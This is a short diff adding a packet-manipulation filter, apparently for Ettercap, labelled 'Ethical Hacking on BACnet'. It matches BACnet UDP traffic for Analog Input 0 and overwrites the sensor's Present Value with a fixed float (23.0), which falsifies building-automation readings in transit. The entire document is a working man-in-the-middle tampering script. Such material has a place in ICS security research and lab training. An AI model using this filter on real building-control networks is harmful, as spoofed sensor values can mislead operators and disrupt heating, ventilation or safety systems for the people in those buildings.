@@ -1,0 +1,6 @@
+#modify the bacnet payload to a specific value; Ethical Hacking on BACnet
+if (ip.proto == UDP && DATA.data + 15 == "\x2c\x00\x00\x00\x00") #payload, bacnet identifier object Analog input 0.
+{
+DATA.data + 26 ="\x44\x41\xb8\x00\x00"; #payload, Present.Value.0.real/Analog input 0/IEEE 754
+msg("replace buffer 23");
+}
